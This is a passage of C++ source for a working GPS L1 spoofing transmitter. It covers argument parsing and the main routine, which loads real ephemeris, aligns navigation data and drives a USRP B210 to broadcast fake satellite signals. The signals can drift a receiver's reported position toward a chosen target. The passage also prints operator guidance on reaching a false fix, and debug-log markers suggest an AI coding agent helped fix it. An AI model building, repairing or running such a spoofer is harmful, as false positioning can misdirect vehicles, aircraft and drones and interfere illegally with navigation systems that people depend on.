                std::cerr << "\n[U-PKT] Underflow inside packet\n";
                break;
            default:
                std::cerr << "\n[ASYNC] Code=" << async_md.event_code << "\n";
        }
    }
}

// =============================================================================
// SECTION 15: ARGUMENT PARSING
// =============================================================================

struct Config {
    double      lat         = 17.604012;
    double      lon         = 78.126885;
    double      alt         = 100.0;
    double      target_lat  = 17.604012;
    double      target_lon  = 78.126885;
    double      target_alt  = 100.0;
    double      l1_gain     = L1_GAIN_DB;
    double      rx_gain     = RX_GAIN_DB;
    double      amplitude   = -1.0;   // -1 = auto (0.8/N_SV); override with --amplitude
    double      gps_tow     = -1.0;
    bool        rinex_time  = false;
    std::string usrp_args;
    std::string rinex_path;
};

static void print_help(const char* prog) {
    std::cout << "Usage: " << prog << " [options]\n"
              << "  --rinex      <path>  Path to TODAY's RINEX 2.11 nav file (REQUIRED)\n"
              << "                       Download: https://cddis.nasa.gov  file: brdcDDD0.YYn\n"
              << "  --lat        <deg>   Spoof latitude          (default: 17.604012)\n"
              << "  --lon        <deg>   Spoof longitude         (default: 78.126885)\n"
              << "  --alt        <m>     Altitude                (default: 100.0)\n"
              << "  --target-lat <deg>   Drift target lat        (default: same as --lat)\n"
              << "  --target-lon <deg>   Drift target lon        (default: same as --lon)\n"
              << "  --target-alt <m>     Drift target alt        (default: 100.0)\n"
              << "  --l1-gain    <dB>    B210 TX gain 0-89 dB    (default: " << L1_GAIN_DB << ")\n"
              << "  --amplitude  <0-1>   IQ amplitude per SV     (default: 0.8/N_SV)\n"
              << "                       Increase if signal too weak; decrease if saturating LNA\n"
              << "  --tow        <s>     GPS TOW override        (default: system clock)\n"
              << "  --rinex-time         Use RINEX freshest toe+30s instead of system clock\n"
              << "                       Only needed when using YESTERDAY's RINEX file\n"
              << "  --args       <str>   UHD device args         (default: first found)\n"
              << "  --help\n\n"
              << "TYPICAL USAGE (today's RINEX, no --rinex-time needed):\n"
              << "  " << prog << " --rinex brdc1500.26n --lat 17.604012 --lon 78.126885 --l1-gain 75\n";
}

static Config parse_args(int argc, char* argv[]) {
    Config c;
    for (int i = 1; i < argc; ++i) {
        const std::string a = argv[i];
        if      (a=="--rinex"      && i+1<argc) c.rinex_path = argv[++i];
        else if (a=="--lat"        && i+1<argc) c.lat        = std::stod(argv[++i]);
        else if (a=="--lon"        && i+1<argc) c.lon        = std::stod(argv[++i]);
        else if (a=="--alt"        && i+1<argc) c.alt        = std::stod(argv[++i]);
        else if (a=="--target-lat" && i+1<argc) c.target_lat = std::stod(argv[++i]);
        else if (a=="--target-lon" && i+1<argc) c.target_lon = std::stod(argv[++i]);
        else if (a=="--target-alt" && i+1<argc) c.target_alt = std::stod(argv[++i]);
        else if (a=="--l1-gain"    && i+1<argc) c.l1_gain    = std::stod(argv[++i]);
        else if (a=="--rx-gain"    && i+1<argc) c.rx_gain    = std::stod(argv[++i]);
        else if (a=="--amplitude"  && i+1<argc) c.amplitude  = std::stod(argv[++i]);
        else if (a=="--tow"        && i+1<argc) c.gps_tow    = std::stod(argv[++i]);
        else if (a=="--rinex-time")            c.rinex_time = true;
        else if (a=="--args"       && i+1<argc) c.usrp_args  = argv[++i];
        else if (a=="--help") { print_help(argv[0]); std::exit(0); }
        else {
            std::cerr << "[ERROR] Unknown arg: " << a << "\n";
            print_help(argv[0]);
            std::exit(1);
        }
    }
    // Mirror lat/lon to target if user didn't override (static position)
    // Only apply if targets are still at the built-in defaults and lat/lon changed
    return c;
}

// =============================================================================
// SECTION 16: MAIN
// =============================================================================

int main(int argc, char* argv[])
{
    // #region agent log
    dbg_log_marker_stdout();
    dbg_ndjson_append("pre-fix", "H0", "ultimate_spoofer.cpp:main:entry",
                      "Main entered (instrumented build running)", "{}");
    // #endregion agent log

    std::signal(SIGINT,  sig_handler);
    std::signal(SIGTERM, sig_handler);

    const Config cfg = parse_args(argc, argv);

    if (cfg.rinex_path.empty()) {
        print_help(argv[0]);
        std::cerr << "\n[ERROR] --rinex <path> is required.\n";
        return 1;
    }

    // ── Derive GPS TOW ────────────────────────────────────────────────────────
    double gps_tow;
    if (cfg.rinex_time) {
        const double ft = scan_rinex_freshest_toe(cfg.rinex_path);
        if (ft < 0.0) {
            std::cerr << "[ERROR] --rinex-time: could not read freshest toe from "
                      << cfg.rinex_path << "\n";
            return 1;
        }
        gps_tow = ft + 30.0;
        std::cout << "[TIME] --rinex-time: GPS TOW=" << gps_tow
                  << " s (freshest RINEX toe=" << ft << " + 30 s)\n";
    } else if (cfg.gps_tow > 0.0) {
        gps_tow = cfg.gps_tow;
        std::cout << "[TIME] Override GPS TOW: " << gps_tow << " s\n";
    } else {
        const auto now = std::chrono::system_clock::now();
        const long unix_s = std::chrono::duration_cast<std::chrono::seconds>(
                                now.time_since_epoch()).count();
        // GPS epoch = 1980-01-06. Offset from Unix = 315,964,800 s. Leap seconds = 18.
        gps_tow = static_cast<double>((unix_s - 315'964'800L + 18L) % 604'800L);
        std::cout << "[TIME] GPS TOW from system clock: " << gps_tow << " s\n";
    }

    const WGS84 user_pos   {cfg.lat,        cfg.lon,        cfg.alt};
    const WGS84 final_target{cfg.target_lat, cfg.target_lon, cfg.target_alt};

    // ── Print configuration ───────────────────────────────────────────────────
    std::cout << "\n"
              << "╔══════════════════════════════════════════════════════════╗\n"
              << "║   Single-Band L1 GPS Spoofing Engine (All Flaws Fixed)   ║\n"
              << "╚══════════════════════════════════════════════════════════╝\n"
              << std::fixed << std::setprecision(6)
              << "  Start pos  : " << cfg.lat << "°N  " << cfg.lon << "°E  "
                                   << cfg.alt << "m\n"
              << "  Drift dest : " << cfg.target_lat << "°N  " << cfg.target_lon
                                   << "°E  " << cfg.target_alt << "m\n"
              << std::setprecision(3)
              << "  Sample rate: " << SAMPLE_RATE_HZ/1e6 << " Msps (4.096 — L1 C/A only)\n"
              << "  MCR        : " << MASTER_CLK_HZ/1e6  << " MHz (integer ratio 4:1)\n"
              << "  L1 TX freq : " << L1_FREQ_HZ/1e6    << " MHz | gain " << cfg.l1_gain << " dB\n"
              << "  RX freq    : " << L1_FREQ_HZ/1e6    << " MHz | gain " << cfg.rx_gain << " dB\n"
              << "  Wire format: sc8 (~8.2 MB/s single channel)\n"
              << "  Nav data   : 50 bps LNAV (preamble 0x8B, 300-bit subframe)\n"
              << "  SPSC rings : " << RING_CAPACITY << " blocks × " << SAMPLES_PER_MS << " samples\n"
              << "\n"
              << "  Fixes applied:\n"
              << "    FIX 1: Drift active — current_pos moves 1 m/s toward target in OWN phase\n"
              << "    FIX 2/3/5: L2/MIMO/ch1 removed — single-channel L1 only\n"
              << "    FIX 4: synthesize_block indexes code.chips by sample position (not chip)\n"
              << "    FIX 6: AGC frozen at LISTEN_MS — no TX→RX feedback loop\n\n";

    // ── Require RINEX file (Problem 3 fix) ───────────────────────────────────
    // cddis.nasa.gov now requires a free NASA Earthdata login — curl without
    // credentials returns an HTML login page, not RINEX data.  The program
    // no longer downloads anything automatically; the operator must supply a
    // pre-downloaded RINEX 2.11 broadcast ephemeris file via --rinex.
    if (cfg.rinex_path.empty()) {
        const std::string url = build_rinex_url();
        std::cerr << "\n[ERROR] --rinex <path> is required.\n\n"
                  << "  Today's RINEX file must be downloaded manually:\n\n"
                  << "  1. Register (free) at: https://urs.earthdata.nasa.gov\n"
                  << "  2. Download today's broadcast ephemeris:\n"
                  << "         " << url << "\n"
                  << "     or via wget (with stored credentials in ~/.netrc):\n"
                  << "         wget --load-cookies ~/.urs_cookies \\\n"
                  << "              --save-cookies ~/.urs_cookies \\\n"
                  << "              --keep-session-cookies \\\n"
                  << "              \"" << url << "\"\n\n"
                  << "  3. Run with:\n"
                  << "         " << argv[0]
                  << " --rinex <downloaded_file> [other options]\n\n";
        return 1;
    }

    // ── Build constellation ───────────────────────────────────────────────────
    std::cout << "[CONST] Loading live constellation from RINEX file...\n";
    ConstellationResult cr = generate_live_constellation(
        cfg.rinex_path, cfg.lat, cfg.lon, cfg.alt, gps_tow);

    if (cr.ephs.empty()) {
        std::cerr << "[ERROR] No visible SVs found in RINEX file — cannot continue.\n"
                  << "        Verify the file is a valid RINEX 2.11 broadcast nav file\n"
                  << "        for today's date, and that your lat/lon/tow are correct.\n";
        return 1;
    }

    // ── Deduplicate: keep only the freshest ephemeris per SV ───────────────
    // RINEX files contain multiple ephemeris sets per satellite (different toe).
    // Without dedup, sorting by elevation picks the same SV multiple times
    // (e.g. SV18 ×5, SV23 ×3 = only 2 unique PRNs → no 3D fix possible).
    {
        std::map<int, size_t> best; // sv_id → index of best ephemeris
        for (size_t i = 0; i < cr.ephs.size(); ++i) {
            int id = cr.ephs[i].sv_id;
            auto it = best.find(id);
            if (it == best.end()) {
                best[id] = i;
            } else {
                // Keep the one with toe closest to current time
                const double dt_old = ephemeris_age_sec(gps_tow, cr.ephs[it->second].toe);
                const double dt_new = ephemeris_age_sec(gps_tow, cr.ephs[i].toe);
                if (dt_new < dt_old) it->second = i;
            }
        }
        std::vector<Ephemeris> unique_ephs;
        unique_ephs.reserve(best.size());
        for (auto& [id, idx] : best)
            unique_ephs.push_back(cr.ephs[idx]);
        cr.ephs = std::move(unique_ephs);
        std::cout << "[CONST] " << cr.ephs.size() << " unique SVs after dedup\n";
    }

    if (cr.freshest_toe >= 0.0) {
        const double rinex_age_h = ephemeris_age_sec(gps_tow, cr.freshest_toe) / 3600.0;
        std::cout << "[TIME] Freshest RINEX toe: " << std::fixed << std::setprecision(1)
                  << cr.freshest_toe << " s  (|" << gps_tow << "−toe| = "
                  << rinex_age_h << " h)\n";
        if (rinex_age_h > MAX_EPH_AGE_SEC / 3600.0) {
            std::cerr << "\n[TIME][WARN] Ephemeris is STALE for current GPS TOW.\n"
                      << "  Symptom: GPS Test shows satellites 'in view' but 0 'in use', No Fix.\n"
                      << "  Fix: re-run with  --rinex-time\n"
                      << "       or download today's brdc file again.\n\n";
        }
    }

    // Drop SVs whose broadcast ephemeris is too old (handsets refuse PVT)
    {
        std::vector<Ephemeris> fresh;
        fresh.reserve(cr.ephs.size());
        for (const auto& e : cr.ephs) {
            const double age = ephemeris_age_sec(gps_tow, e.toe);
            if (age <= MAX_EPH_AGE_SEC) {
                fresh.push_back(e);
            } else {
                std::cerr << "[CONST][SKIP] SV" << std::setw(2) << e.sv_id
                          << " ephemeris age " << std::fixed << std::setprecision(0)
                          << age << " s (> " << MAX_EPH_AGE_SEC << " s max)\n";
            }
        }
        if (fresh.empty()) {
            // FIX-AUTORT: Auto-apply --rinex-time when system-clock TOW makes
            // all ephemerides stale (e.g. using yesterday's RINEX with today's clock).
            if (cr.freshest_toe >= 0.0) {
                const double auto_tow = cr.freshest_toe + 30.0;
                std::cerr << "\n[AUTO-RINEX-TIME] All SVs stale at TOW=" << gps_tow
                          << ". Auto-switching to rinex-time TOW=" << auto_tow
                          << " (freshest toe=" << cr.freshest_toe << " + 30 s).\n";
                gps_tow = auto_tow;
                // Re-run age filter with the new TOW
                for (const auto& e : cr.ephs) {
                    const double age = ephemeris_age_sec(gps_tow, e.toe);
                    if (age <= MAX_EPH_AGE_SEC) fresh.push_back(e);
                }
                if (fresh.empty()) {
                    std::cerr << "[ERROR] Still no fresh ephemeris after auto rinex-time. "
                              << "Download today's RINEX file.\n";
                    return 1;
                }
                std::cout << "[AUTO-RINEX-TIME] " << fresh.size()
                          << " SVs now within age limit.\n";
            } else {
                std::cerr << "[ERROR] No ephemeris within "
                          << static_cast<int>(MAX_EPH_AGE_SEC / 3600) << " h of GPS TOW="
                          << gps_tow << " s. Run with --rinex-time.\n";
                return 1;
            }
        }
        if (fresh.size() < cr.ephs.size()) {
            std::cout << "[CONST] " << fresh.size() << " SVs with fresh ephemeris (dropped "
                      << (cr.ephs.size() - fresh.size()) << " stale)\n";
        }
        cr.ephs = std::move(fresh);
    }

    const IonoModel iono_model = make_iono_model(cr.iono);

    // ── Cap constellation to N_SV satellites (sorted by elevation) ─────────
    if (static_cast<int>(cr.ephs.size()) > N_SV) {
        const WGS84 obs{cfg.lat, cfg.lon, cfg.alt};
        std::sort(cr.ephs.begin(), cr.ephs.end(),
            [&](const Ephemeris& a, const Ephemeris& b) {
                try {
                    auto ta = SatCalc::calculate_target(a, obs, gps_tow, ECEFVel{}, &iono_model);
                    auto tb = SatCalc::calculate_target(b, obs, gps_tow, ECEFVel{}, &iono_model);
                    return ta.elevation_deg > tb.elevation_deg;
                } catch (...) { return false; }
            });
        std::cout << "[CONST] Capping from " << cr.ephs.size()
                  << " unique SVs to " << N_SV << " (highest elevation)\n";
        cr.ephs.resize(N_SV);
    }

    std::vector<SvState> sv_states;
    sv_states.reserve(cr.ephs.size());
    for (const auto& e : cr.ephs) {
        sv_states.emplace_back(e, cr.iono);
        const double age = ephemeris_age_sec(gps_tow, e.toe);
        std::cout << "  SV" << std::setw(2) << e.sv_id
                  << ": L1 code table (" << SAMPLES_PER_MS << " samp @ 4.096 Msps)"
                  << "  toe_age=" << std::fixed << std::setprecision(0) << age << "s\n";
    }

    std::cout << "[IONO] Klobuchar model "
              << (iono_model.valid ? "loaded from RINEX header" : "using nominal defaults")
              << " — will be embedded in pseudoranges and broadcast in SF4 Page 18.\n";

    // Verify sky geometry
    std::cout << "\n[CONST] Sky geometry at TOW=" << gps_tow << "s:\n";
    int vis = 0;
    for (const auto& sv : sv_states) {
        try {
            const TargetState ts = SatCalc::calculate_target(sv.eph, user_pos, gps_tow,
                                                             ECEFVel{}, &iono_model);
            std::cout << "  SV" << std::setw(2) << sv.sv_id
                      << ": EL=" << std::setw(5) << std::setprecision(1)
                      << ts.elevation_deg << "°"
                      << "  AZ=" << std::setw(6) << ts.azimuth_deg << "°"
                      << "  Dop=" << std::setw(7) << std::setprecision(0)
                      << ts.doppler_hz << " Hz  ✓\n";
            ++vis;
        } catch (const std::exception& ex) {
            std::cerr << "  SV" << sv.sv_id << ": " << ex.what() << "\n";
        }
    }
    std::cout << "\n  " << vis << " SVs visible above " << EL_MASK_DEG
              << "° mask — " << (vis >= 4 ? "GDOP sufficient for 3D fix." : "WARNING: need ≥4 SVs for fix.") << "\n";

    // ── Code phase / nav bit init ─────────────────────────────────────────────
    // CRITICAL: Use the EXACT gps_tow that the DSP will start with.
    // The old aligned_tow (floor(tow/30)*30) caused a 0-29 second nav bit offset
    // because the DSP started 0-29 s AFTER the aligned reference time, making
    // the HOW word point to subframes that the receiver already missed.
    // generateNavMsg() aligns g0_sec to 30 s internally — no pre-alignment needed.
{
    const WGS84 obs{cfg.lat, cfg.lon, cfg.alt};
    const ECEF  ecef = CoordinateMath::lla_to_ecef(obs);
    const double user_xyz[3] = {ecef.x, ecef.y, ecef.z};

    std::cout << "[INIT] computeCodePhase & NavBit alignment for " << sv_states.size() << " SVs at TOW=" << gps_tow << "s\n";
    for (SvState& sv : sv_states) {
        gps_init_channel_pseudorange(sv.chan, sv.eph, gps_tow, user_xyz, iono_model);
        std::cout << "[INIT-NAV] SV" << std::setw(2) << sv.sv_id
                  << " | iword=" << sv.chan.iword
                  << " ibit=" << sv.chan.ibit
                  << " icode=" << sv.chan.icode
                  << " code_phase=" << std::fixed << std::setprecision(2) << sv.chan.code_phase << "\n";
    }
}
    // ── Init USRP ─────────────────────────────────────────────────────────────
    std::cout << "[HW] Opening USRP...\n";
    uhd::usrp::multi_usrp::sptr usrp;
    try {
        usrp = uhd::usrp::multi_usrp::make(cfg.usrp_args);
    } catch (const std::exception& ex) {
        std::cerr << "[ERROR] USRP open failed: " << ex.what() << "\n";
        return 1;
    }
    std::cout << "[HW] " << usrp->get_pp_string() << "\n";

    // ── Master clock rate ─────────────────────────────────────────────────────
    // 16.384 MHz gives exact integer decimation to 4.096 Msps (ratio = 4).
    // Must be set before set_tx_rate() / set_rx_rate().
    usrp->set_master_clock_rate(MASTER_CLK_HZ);
    std::this_thread::sleep_for(std::chrono::milliseconds(300));
    std::cout << "[HW] Master clock: "
              << usrp->get_master_clock_rate() / 1e6 << " MHz\n";

    // ── TX channel 0 (L1) ────────────────────────────────────────────────────
    // TX-ONLY: No RX setup. Only transmit fake GPS at L1 1575.42 MHz.
    usrp->set_tx_rate(SAMPLE_RATE_HZ, 0);
    usrp->set_tx_freq(uhd::tune_request_t(L1_FREQ_HZ), 0);
    usrp->set_tx_gain(cfg.l1_gain, 0);
    usrp->set_tx_antenna("TX/RX", 0);
    std::cout << "[HW] TX ch0: " << usrp->get_tx_freq(0)/1e6 << " MHz  "
              << usrp->get_tx_rate(0)/1e6 << " Msps  "
              << usrp->get_tx_gain(0) << " dB  L1\n";

    // ── DC offset + IQ balance calibration ───────────────────────────────────
    try {
        usrp->set_tx_dc_offset(true, 0);
        usrp->set_tx_iq_balance(true, 0);
        std::cout << "[CAL] DC offset + IQ balance: TX ch0 calibrated\n";
    } catch (const uhd::not_implemented_error&) {
        std::cerr << "[CAL] DC/IQ auto-cal not supported on this hardware\n";
    }

    // ── Wait for TX LO lock ──────────────────────────────────────────────────
    std::cout << "[HW] Waiting for TX LO lock";
    for (int i = 0; i < 50; ++i) {
        bool locked = false;
        try { locked = usrp->get_tx_sensor("lo_locked", 0).to_bool(); }
        catch (...) {}
        if (locked) break;
        std::cout << "." << std::flush;
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
    std::cout << " OK\n";
    std::this_thread::sleep_for(std::chrono::milliseconds(500));

    // ── Build TX stream (single channel) ─────────────────────────────────────
    uhd::stream_args_t tx_sa("fc32", "sc8");
    tx_sa.channels = {0};
    auto tx_stream = usrp->get_tx_stream(tx_sa);
    std::cout << "[HW] TX stream: 1 channel, wire=sc8, "
              << "max_spp=" << tx_stream->get_max_num_samps() << "\n";

    // ── Allocate TX ring buffer ──────────────────────────────────────────────
    auto tx_ring = std::make_unique<TxRing>();

    std::cout << "\n[MAIN] TX-ONLY mode. Starting workers...\n"
              << "[MAIN] Pipeline: DSP → TxRing[" << RING_CAPACITY << "] → TX ch0\n\n";

    // ── Start threads ─────────────────────────────────────────────────────────
    std::thread t_async(async_monitor, tx_stream);
    t_async.detach();

    std::thread t_tx(tx_worker, tx_stream, std::ref(*tx_ring));

    // Re-read GPS time right before DSP starts to account for B210 hardware
    // init delay (~5-10 s). Without this, gps_tow is stale and the HOW word
    // will point to subframes already in the past → receiver computes wrong
    // pseudoranges → no fix.
    {
        const auto now2 = std::chrono::system_clock::now();
        const long unix2 = std::chrono::duration_cast<std::chrono::seconds>(
                               now2.time_since_epoch()).count();
        const double tow2 = static_cast<double>((unix2 - 315'964'800L + 18L) % 604'800L);
        if (std::fabs(tow2 - gps_tow) > 1.0 && std::fabs(tow2 - gps_tow) < 300.0) {
            std::cout << "[TIME] HW-init drift: GPS TOW updated " << gps_tow
                      << " -> " << tow2 << " (+"
                      << static_cast<int>(tow2 - gps_tow) << " s)\n";
            gps_tow = tow2;
            // Re-init code phase with the fresh TOW so HOW matches transmission time
            const WGS84 obs2{cfg.lat, cfg.lon, cfg.alt};
            const ECEF  ec2 = CoordinateMath::lla_to_ecef(obs2);
            const double xyz2[3] = {ec2.x, ec2.y, ec2.z};
            for (SvState& sv : sv_states)
                gps_init_channel_pseudorange(sv.chan, sv.eph, gps_tow, xyz2, iono_model);
            std::cout << "[TIME] Code phase re-aligned to TOW=" << gps_tow << "\n";
        }
    }

    const float amp_arg = (cfg.amplitude > 0.0) ? static_cast<float>(cfg.amplitude) : 0.0f;
    std::thread t_dsp(dsp_worker,
                      std::ref(sv_states),
                      std::cref(user_pos),
                      std::cref(final_target),
                      gps_tow,
                      std::ref(*tx_ring),
                      std::cref(iono_model),
                      amp_arg);

    // ── Operator guidance ─────────────────────────────────────────────────────
    std::cout << "[MAIN] Spoofing active. Ctrl+C to stop.\n\n"
              << "  TX-ONLY mode: transmitting fake GPS at " << L1_FREQ_HZ/1e6 << " MHz\n"
              << "  TX gain: " << cfg.l1_gain << " dB\n"
              << "  " << sv_states.size() << " satellites, " << SAMPLE_RATE_HZ/1e6 << " Msps\n\n"
              << "  Connect B210 TX/RX port to GPS receiver antenna input.\n"
              << "  Expected behavior:\n"
              << "    • C/A code acquisition within ~5s\n"
              << "    • 3D fix within ~90s (LNAV subframe decode)\n"
              << "    • Position drift after 30s toward target\n\n";

    // ── Wait for shutdown ─────────────────────────────────────────────────────
    t_dsp.join();
    g_stop.store(true);

    t_tx.join();

    std::cout << "[MAIN] Clean exit.\n";
    return 0;
}
